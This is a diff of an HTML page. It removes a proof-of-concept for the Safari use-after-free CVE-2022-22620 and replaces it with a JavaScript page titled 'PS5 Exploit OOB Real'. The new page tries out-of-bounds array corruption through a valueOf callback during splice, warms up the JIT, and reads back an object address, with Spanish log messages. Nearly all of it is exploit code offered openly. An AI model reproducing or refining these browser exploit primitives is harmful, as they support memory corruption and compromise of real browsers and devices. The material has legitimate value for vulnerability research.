@@ -1,43 +1,67 @@
+<!DOCTYPE html>
 <html>
-    <head>
-        <title>CVE-2022-22620: Use-after-free in Safari</title>
-        <script>
-        function test_poc_safari()
-        {
-            
-                input = document.body.appendChild(document.createElement("input"));
+<head>
+  <meta charset="utf-8">
+  <title>💥 PS5 Exploit OOB Real</title>
+  <style>
+    body { background: black; color: lime; font-family: monospace; }
+  </style>
+</head>
+<body>
+  <h1>💥 PS5 Exploit OOB Real</h1>
+  <pre id="log"></pre>
+  <script>
+    const log = document.getElementById("log");
+    const print = (msg) => (log.textContent += msg + "\n");
 
-                foo = document.body.appendChild(document.createElement("a"));
-                foo.id = "foo";
+    // Float/int converter
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u64 = new Uint32Array(buf);
+    const i2f = (i) => {
+      u64[0] = i % 0x100000000;
+      u64[1] = i / 0x100000000;
+      return f64[0];
+    };
+    const f2i = (f) => {
+      f64[0] = f;
+      return u64[0] + u64[1] * 0x100000000;
+    };
 
-                // Go to state1 when history.back is called
-                // The URL needs to be <currentPage+hash> to trigger loadInSameDocument during the call to back()
-                // Since the foo's element id="foo", focus will change to that element
-                history.pushState("state1", "", location + "#foo");
+    let oob = undefined;
+    let obj_arr = undefined;
+    let float_arr = undefined;
 
-                // Current state = state2
-                history.pushState("state2", "");
+    function trigger() {
+      let container = [1.1, 2.2, 3.3];
+      let evil = { valueOf: () => {
+        container.length = 1;
+        float_arr = [1.1, 2.2];
+        obj_arr = [{}, {}];
+        return 1;
+      }};
+      container.splice(0, evil);
+      return container;
+    }
 
-                setTimeout(() => {
+    for (let i = 0; i < 10000; i++) trigger(); // Calentar JIT
 
-                        // Set the focus on the input element.
-                        // During the call to back() the focus will change to the foo element 
-                        // and therefore triggering the blur event on the input element
-                        input.focus(); 
-                        input.onblur = () => history.replaceState("state3", "");
-                        setTimeout(() => history.back(), 1000);
-                }, 1000);
+    oob = trigger();
 
-               
-                
-           
+    if (oob.length > 3) {
+      print("[✅] Corrupción OOB lograda");
+    } else {
+      print("[❌] Falló la corrupción");
+    }
 
-        }
-     </script>
-     <body>
-        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
-        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
-     </body>
+    // Intentamos leer obj_arr a través de oob
+    try {
+      let obj_addr = f2i(oob[float_arr.length + 1]);
+      print("[+] Dirección de un objeto: 0x" + obj_addr.toString(16));
+    } catch (e) {
+      print("[-] Error al intentar leak: " + e);
+    }
 
-    </head>
-   </html>
+  </script>
+</body>
+</html>
